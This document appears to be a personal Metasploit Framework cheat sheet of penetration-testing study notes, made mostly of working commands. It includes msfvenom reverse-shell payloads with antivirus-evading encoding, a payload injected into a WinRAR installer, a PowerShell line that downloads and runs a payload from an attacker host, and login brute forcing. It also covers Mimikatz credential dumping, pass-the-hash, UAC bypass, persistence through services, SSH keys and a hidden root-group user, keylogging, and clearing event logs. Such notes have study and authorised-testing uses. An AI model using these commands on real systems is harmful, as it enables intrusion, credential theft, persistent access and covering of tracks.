Metasploit Framework
# Table of Contents
1. [Overview](#Overview)
2. [Architecture](#Architecture)
	1. Interfaces
	2. Modules
		1. Meterpreter Payload
	3. Libraries
	4. Diagram
	5. The Penetration Testing Execution Standard (PTES)
3. [Usage](#Usage)
	1. nmap importing or running scan
	2. [Auxiliary Modules](#Auxiliary_Modules)
	3. [Workflow Examples](#Workflow_Examples)
		1. [FTP](#FTP)
		2. [SMB](#SMB)
		3. [MYSQL](#MYSQL)
		4. [SSH](#SSH)
		5. [SMTP](#SMTP)
	4. [Vulnerability Scanning](#Vulnerability_Scanning)
	5. [msfvenom](#msfvenom)
	6. Automation
	7. Show information gathered
	8. [Meterpreter](#Meterpreter)
		1. [Post exploitation](#Post_Exploitation)
		2. [Post Modules](#Post_Modules)
			1. Windows Modules
			2. Linux_Modules
		4. Upgrade shell to meterpreter
	9. [Privilege Escalation](#Privilege_Escalation)
		1. [UAC Bypass](#UAC_Bypass)
		2. [Token Impersonation](#Token_Impersonation)
		3. [Mimikatz](#Mimikatz)
		4. [Pass-The-Hash](#Pass-The-Hash)
		5. [chkrootkit Exploit](#chkrootkit_Exploit)
	10. [Persistance](#Persistance)
		1. Windows
			1. [Shell Service](#Shell_Service)
			2. [Enableing RDP](#Enableing_RDP)
		3. Linux
			1. [Add User Manual](#Add_User_Manual)
			2. [SSH-Key](#SSH-Key)
			3. [Service Persistence](#Service_Persistence)
	11. [Post](#Post)
		1. Windows
			1. [Keylogging](#Keylogging)
			2. [EventLogs](#EventLogs)
			3. [Pivoting Windows](#Pivoting-Windows)



---

# Overview

- Interface : Methods of interacting with the MSF
- Module : pieces of code that perform a particular task such as an exploit
- Vulnerability : Weakness or flaw in a system that can be exploited
- Exploit : Piece of code/module that is used to take advantage of a vulnerability
- Payload: piece of code delivered to the target by an expoit with the objective of executing arbitrary commands or providing remote access to attacker.
- Listener : a utility that listens for an incoming connection from a target

---

# Architecture
## Interfaces
- `msfconsole` : All in one interface to the MSF
- `MSFcli` : Command line interface that is useful for scripting, deprecated in 2015 and the functionality migrated into the MSFconsole.
- Armitage : A free java based GUI for the MSF
- Web : web interface

## Modules
A module is a piece of code that can be utilized by the MSF. Libraries facilitate the execution of modules.
- Exploit : A module use to take advantage, usually paired with a payload
- Payload : code delivered to target to take advantage, example is reverse shell
	- Non-staged : payload that is sent to target along with the exploit
	- Staged Payload : first payload contains reverse shell, second part is then downloaded and executed
		- Stagers : used to establish stable connection
		- Stage: payload components that are downloaded
- Encoder : used to encode payloads in order to avoid AV detection
- NOP : used to ensure that payloads sizes are consistent and stability
- Auxiliary : used to perform additional functionality like port scanning and enumeration
### Meterpreter Payload
The meterpreter (meta-interpreter) payload is an advanced multi-functional payload that is executed in memory on the target system. It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file navigation and manipulation key-logging, and etc...

## Libraries
- Rex
- MSF Core
- MSF Base

## Diagram
```
 Tools --------> Rex
                 /\
              MSF Core
                 /\
 Plugins ---> MSF Base <------- Interfaces
                 /\
              Modules
```


---

## The Penetration Testing Execution Standard (PTES)
http://www.pentest-standard.org/index.php/Main_Page

| Penetration Testing Phase           | Metasploit Framework Implementation    |
| ----------------------------------- | -------------------------------------- |
| Information Gathering & Enumeration | Auxiliary Modules                      |
| Vulnerability Scanning              | Auxiliary Modules, Nessus              |
| Exploitation                        | Exploit Modules & Payloads             |
| Post Exploitation                   | Meterpreter                            |
| Privilege Escalation                | Post Exploitation Modules, Meterpreter |
| Maintaining Persistent Access       | Post Exploitation Modules, Persistence |

---

# Usage

## nmap importing or running scan
- `workspace -a Test` : add a new workspace
- `db_import /root/winserver.xml` : import an nmap scan
- `hosts` : show hosts
- `services` : show services detected on the hosts
- `db_nmap -Pn -sV -O` : run and import an nmap scan 
- You can import from a nessus scan ScanFile.nessus

## Auxiliary_Modules
- `search portscan` : bring up scanner modules
- `use auxiliary/scanner/portscan/tcp`
- `show options` : check the options
- `set rhosts` : set target
- get access to target 1 and once you have a meterpreter session spawn a shell and `/bin/bash -i` to get bash and then run ifconfig to grab the information of the second network. exit shell
- `run autoroute -s 192.113.124.2` : in meterpreter add route to the network
- drop to background
- load portscan and set rhosts to the 2nd system
- once run, the portscan will be routed through the first machine
- auxiliary/scanner/discovery/udp_sweep : another module to do UDP port sweep

---

## Workflow_Examples

### #FTP
[Service info - FTP](../Services/FTP.md)
1. `search type:auxiliary name:ftp` : find scanner for ftp version
	1. use module on target to get service version
2. `search type:auxiliary name:ftp` : ftp_login for brute forcing
	1. set user file and pass file

### #SMB
[Service info - SMB](../Services/SMB.md)
1. `search type:auxiliary name:smb` : smb_version scanner
	1. use to enumerate smb on target
2. `search type:auxiliary name:smb` : smb_enumusers
	1. `info` give information on the module
3. `search type:auxiliary name:smb` : smb_enumshares
4. smb_login : brute force login
	1. can set user to admin discovered and then try passfile
5. use [smbclient](../Services/SMB.md#smbclient) to login

### #WebServer
[Service info - HTTP](../Services/HTTP.md)
1. `search type:auxiliary name:http` : http_version
	1. use to find the service version
2. `search type:auxiliary name:http` : http_header
	1. grabs methods and header information
3. `search type:auxiliary name:http` : robots_txt
	1. finds information for the robots file
	2. `curl` a dir to check it out
4. dir_scanner : find directories
	1. `set DICTIONARY` 
	2. `set PATH` 
5. files_dir : find files in directories
6. apache_userdir_enum : look at info
	1. `set USER_FILE /wordlists/common_users.txt`
	2. find valid users then create a custom file to use below with users. This will let you narrow down without having to brute force nonexistent users
7. `search type:auxiliary name:http_login` : brute force login
	1. `set AUTH_URI` : target dir
	2. might need to `unset userpass_file` if providing separately
	3. `set verbose false`
	4. `set USER_FILE /usr/share/metaspolit-framework/data/wordlists/namelist.txt`
	5. `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

### #MYSQL
[Service info - SQL](../Services/SQL.md)
1. `search type:auxiliary name:mysql` : mysql_version
	1. grab version information
2. `search mysql_login` : brute force login
	1. set userpass_file and user info
3. `search mysql_enum` : needs credentials
	1. set *username* and *password*
4. `search mysql_sql` : needs credentials
	1. allows to execute sql queries
	2. `set SQL "SHOW DATABASES;"`
5. `search mysql_schemadump` : needs credentials
	1. displays schema information

### #SSH
[Service info - SSH](../Services/SSH.md)
1. `serach type:auxiliary name:ssh` : ssh_version
	1. grab version information
2. ssh_enumusers : enumerate users
3. `serach type:auxiliary name:ssh` : ssh_login
	1. brute force password login

### #SMTP
[Service info - SMTP](../Services/SMTP.md)
1. `serach type:auxiliary name:smtp` : smtp_version
	1. grab version information
2. `serach type:auxiliary name:smtp` : smtp_enum
	1. performs user enumeration

### #HTTP
[Service info - HTTP](../Services/HTTP.md)
1. nmap scan to find *HttpFileServer* running, this is *rejetto*
2. `search type:exploit name:rejetto` : find exploit
3. `use exploit/windows/http/rejetto_hfs_exec`
	1. `set RHOST` : set target
	2. `set payload windows/...` : can override default


---

## Vulnerability_Scanning

Finding vulnerabilities that can be exploited
1. scan target to find services and versions
	1. nmap or MSF module
2. search for services
	1. `serach smb` : isnide MSF
	2. `searchsploit "windows smb" | grep -ei "metasploit"`
	3. can find scanner to check for specific exploit vulnerability
3. `analyze` : will analyze based on data in DB
	1. `vulns` : will list out detected vulnerabilities
4. autopwn plugin
	1. GitHub hahwul/metasploit-autopwn
	2. `load db_autopwn`
	3. `db_autopwn -p -t`
5. Can use Nessus and then import results from Nessus export
6. `search cve:2017 name:smb`

### WMAP
1. `load wmap` : load the wmap module
2. `wmap_` : use tab complete to see all options
3. `wmap_sites -a targetIP` : add a target to sites
4. `wmap_targets -h` : view options
5. `wmap_run -h` : view options
6. `wmap_run -t` : show modules that will run
7. `wmap_run -e` : start testing

---

## msfvenom
### Generating_Payloads
- `msfvenom --list payloads | less` : list out all the payloads
	- staged has more sub dirs
		- `windows/x64/meterpreter/reverse_tcp` : os/cpu-arch/type/connection-type
	- non staged is shorter
		- `windows/x64/meterpreter_bind_tcp` : os/cpu-arch/payload
```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > /home/kali/Desktop/paylodx86.exe
```
	- -a : architecture
	- -p : payload : can auto-select based on payload
	- -f : filetype/formats
	- local-host and local-port of the attacker to reverse back to

### Encoding_Payloads
Encoding a payload helps to avoid antivirus solutions with signature based detection.
- `msfvenom --list encoders | less` : list out all the encoders
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -i 5 -e x86/shikataga_nai -f exe > /payloadx86.exe`
	- -e : specify encoder when generating
	- -i : iterations to run on encoder

### Injecting_Payloads
Inject a payload into a windows executable file to avoid detection
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -e x86/shikata_ga_nai -i 8 -f exe -x ~/Downloads/wrar602.exe > ~/Downloads/Windows_payloads/winrar.exe
```
- -x : template file for injection
- -k : will maintain the original function of the file : most files don't work!

### Handler
1. `msfconsole`
	1. `use multi/handler`
	2. `set payload windows/meterpreter/reverse/tcp` : payload you generated
	3. `set LHOST ipaddr` : ip you set for local host
	4. `set LPORT ipaddr` : port you set for local port
2. `run post/windows/manage/migrate` : will attempt to migrate to new process

### Hosting_Download
`python -m SimpleHTTPServer 8080` : python module for basic http server on port 8080

### Example Flow
To get a meterpreter session on windows system.
1. `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
2. `powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`
3. `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
4. `Start-Process "shell-name.exe"`

---

## Automation
Metasploit Resource Scripts are great for creating automation scripts
- `/usr/share/metasploit-framework/scripts/resource/`
	- contains a collection of built in scripts
- Example for setting up handler "handler.rc"
```ruby
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```
- `msfconsole -r handler.rc` : load and run the script
- msf6 > `resource /handler.rc` : can call script within metasploit framework

---

## Show information gathered
Depends on workspace and modules ran within
- `hosts`
- `services`
- `loot` : shows stuff like schema gathered
	- post gather modules auto-collect data
	- `~/.msf4/loot` : storage location
- `creds` : shows credentials
- `vulns -p 445` : can show discovered vulnerabilities and filter by port
- `search cve:2017 name:smb` : search for cve year and name

---

## Meterpreter
### Post_Exploitation
*In a meterpreter session*
- `sysinfo` : system info
- `getuid` : get user info
- `help` : display commands
- `ctrl-z` : background : send to bg
- sessions -h : session help menu
- `sessions -C sysinfo -i 1` : run command on session 1
- `sessions -n test -i 1` :name the session
- `search -d /usr/bin -f "flag*"` :  search in directory for filename
- `shell` : spawn native shell on OS
	- `ctrl-c` : terminate "channel" drop shell and go back to meterpreter
- `ps` : show processes running
- `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
- `execute -f ifconfig` : execute a command
- `getsystem` : try to get higher privilege
- `hashdump` : dump user hashes
- `showmount` : show hard drives

### Post_Modules
#### Windows_Modules
- `search migrate` : look for migrate modules
- `post/windows/gather/win_privs` : shows privileges you have
- `post/windows/gather/enum_logged_on_users` : shows logged in users and SID
- `post/windows/gather/checkvm` : check if VM
- `post/windows/gather/enum_applications` : check installed apps and versions
- `post/windows/gather/enum_av_excluded` : find excluded folders
- `post/windows/gather/enum_computers` : find domain computers
- `post/windows/gather/enume_patches` : find patches
	- `shell` : then run `systeminfo` to gather manually
- `post/windows/gather/enum_shares` : find shares
- `post/windows/manage/enable_rdp` : turn on RDP

- `load powershell` : load powershell then launch
	- `powershell_shell`

#### Linux_Modules
- `post/linux/gather/enum_configs` : linux config files
- `post/multi/gather/env` : OS env settings
- `post/linux/gather/enum_network` : gather network information
- `post/linux/gather/enum_protections` : check for security modules
- `post/linux/gather/enum_system` : system information extensive
- `post/linux/gather/checkcontainer` : check if container
- `post/linux/gather/checkvm` : check if vm
- `post/linux/gather/enum_users_history` : grab bash history for users
##### Other notable Modules
- `post/multi/gather/ssh_creds`
- `post/multi/gather/docker_creds`
- `post/linux/gather/hashdump`
- `post/linux/gather/ecryptfs_creds`
- `post/linux/gather/enum_psk`
- `post/linux/gather/enum_xchat`
- `post/linux/gather/phpmyadmin_credsteal`
- `post/linux/gather/pptpd_chap_secrets`
- `post/linux/manage/sshkey_persistence`

### Upgrade shell to meterpreter
1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
2. `search shell_to_meterpreter` : manually control it
	1. `set SESSION 1` : set target session
	2. `set LHOST eth1` : set local host
	4. `run`

---

## Privilege_Escalation

### UAC_Bypass
*Example Flow* - Windows
1. get meterpreter on host and attempt `getsystem`, doesn't work
2. drop to `shell`, `net users` : check users on system to find users
3. `net localgroup administrators` : find users that are administrators
	1. current user is part of group! 
	2. kill shell
4. `search bypassuac` : a lot of modules here
5. `use /exploit/windows/local/bypassuac_injection` : set module
	1. `set payload windows/x64/meterpreter/reverse_tcp` : set payload
	2. `set SESSION 1` : set session to run on
	3. `set LPORT 4433` : session already using the default 4444
	4. `set TARGET Windows\ x64` : tab completion helps
	5. `run` : should run and open another session on target
	6. `getsystem` : should now work on first session
	7. `hashdump` : yay

### Token_Impersonation
*Example Flow* - Windows
- SeAssignPrimaryToken : This allows a user to impersonate tokens
- SeCreateToken : This allows a user to create an arbitrary token with administrator privileges
- SeImpersonatePrivilege : This allows a user to create a process under the security context of another user typically with administrative privileges
1. get access to machine with meterpreter session
	1. `sysinfo` : grab info on system
	2. `getuid` : show userinfo
	3. `getprivs` : can see we have **SeImpersonatePrivilege**
	4. `load incognito` : load module 
		1. `list_tokens -u` : show available tokens
		2. `impersonate_token "ATTACKDEFENSE\Administrator"` : impersonate a delegation token that was available
	5. `getuid` : we are now administrator
	6. `hashdump` : will fail, we need to migrate to another process
	7. `ps` : show process : `migrate 3544` : migrate to *explorer* which is running as administrator
	8. `hashdump` : will now work!

### Mimikatz
*Example Flow* - Windows
- Can transfer Mimikatz binary to target or use meterpreter kiwi extension in memory.
1. Get a meterpreter session on the target
2. `sysinfo` : system information
3. `pgrep lsass` : find lsass process : `migrate <PID>` migrate to the process
4. `load kiwi` : load kiwi extension : `help` : show commands
	1. `creds_all` : dump all credentials
	2. `lsa_dump_sam` : dump LSA SAM
	3. `lsa_dump_secrets` : SysKey

### Pass-The-Hash
*Example Flow* - Windows
- Pass-The-Hash with **PsExec**
- uses the *NTLM* hash to login via *SMB*
1. Get access to the target and get a meterpreter session.
2. dump the hashes and save them
3. `search psexec` : find PsExec module
4. `use exploit/windows/smb/psexec`
	1. `set payload windows/x64/meterpreter/reverse_tcp`
	2. `set SMBUser <user>`
	3. `set SMBPass <LM:NTLM-Hash>`

### chkrootkit_Exploit
*Example Flow* - Linux
1. Get meterpreter session on target
2. `ps aux` : check running processes
	1. root has a process running /bin/bash /bin/check-down
	2. script that is running chkrootkit
	3. `chkrootkit -v` : shows version
3. `search chkrootkit` : find exploit for it
4. `use exploit/unix/local/chkrootkit`
	1. set options

### Hashdump
*Example Flow* - Linux
1. Get meterpreter session on target
2. `search hashdump` : find related modules
3. `use post/linux/hasdump` : linux dump passwords
	1. `set session <num>` : select meterpreter session
	2. `run` : grab the hashes and stores them in loot
	3. `/etc/passwd` & `/etc/shadow` & unshadowed file formatted for john 


---

## Persistance
### Windows
#### Shell_Service
*Example Flow*
1. Get meterpreter session on target
	1. `sysinfo` : grab what version of windows
	2. `getuid` : need administrator access for persistance
3. `search platform:windows persistence` : look for modules
4. `exploit/windows/local/persistense_service` : service installer
	1. `set payload windows/meterpreter/reverse_tcp`
	2. `set SERVICE_NAME <name>` : set servce name
	3. `set session 1` : set session target
5. `sessions -K` : kill all sessions
6. `use multi/handler` : set up handler with same payload and ports
	1. `set payload windows/meterpreter/reverse_tcp`
	2. `set lport <port>` : set same port as persistance
	3. `run`

#### Enableing_RDP
*Port 3389*
1. Get meterpreter session on target
2. `search enable rdp` : find module
3. `user post/windows/mange/enable_rdp`
	1. `set session <num>` : set session
	2. `run` : enable and open firewall port
	3. `net user administrator password123` : not recommended!
4. `xfreerdp /u:administrator /p:<pass> /v:<IP>` : login

### Linux
#### Add_User_Manual
1. get access to target
2. create a user account that blends in. If ftp doesn't exist already.
	1. `useradd -mlr -d /var/www -s /bin/bash -g root -u 15 ftp`
		1. -m : --create-home : create home with *skel*
		2. -l : --no-log-init : don't add to *lastlog* and *faillog*
		3. -r : --system : no aging information in /etc/shadow
		4. -u : --uid
		5. -g : --groups
	2. `passwd ftp` : set password

#### SSH-Key
Easiest Way
1. `use post/linux/manage/sshkey_persistense`
	1. `set CREATESSHFOLDER true`
	2. `set session <num>`
	3. `run` : will create and add key to user(s)
2. key is added in loot

#### Service_Persistence
Might not work and will need to tweak the target.
1. Get access to target
2. `search platform:linux persistence` : look up persistence modules on linux
3. `use exploit/linux/local/servicepersistence`
	1. `set session <num>` : select session to run on
	2. make sure payload is good
	3. `set LHOST <ip>` : `set LPORT <num>`


---

## Post
### Windows
#### Keylogging

1. Get meterpreter session on target
2. `pgrep explorer` `migreate <pid>` : Migrate to explorer process.
3. `help` : User interface commands section
4. `keyscan_start` : start recording keys
5. `keyscan_dump` : grab the buffer

#### EventLogs
Windows Event Log clearing
1. once you are done in a meterpreter session
2. `clearev` : clear event log

#### Pivoting-Windows
Use a machine that is connected to another network to pivot to it.
- You can check for networks with the following commands
	- `route` : check routing table
	- `arp` : check arp cache
	- `ifconfig/ipconfig` : show interfaces
1. Get meterpreter session on target 1
	1. `run autoroute -s <ip>/24` : add route with meterpreter
2. `use auxiliary/scanner/portscan/tcp` : scanner
	1. `set RHOSTS <target2>` : scan target 2 through route
3. On meterpreter session 1
	1. `portfwd add -l 1234 -p 80 -r <target2>` : forward 80 to local 1234
4. `db_nmap -sS -sV -p1234 localhost` : nmap scan on target 2 through routed port forwarding for the port 80 service
5. Target 2nd machine with exploit
6. `use exploit/windows/badvlue_passthru` : use module
	1. `set payload windows/meterpreter/bind_tcp` : use bind payload
	2. `set LPORT 4422` : unused port
	3. `set RHOSTS <target2>` : target 2 ip

### Linux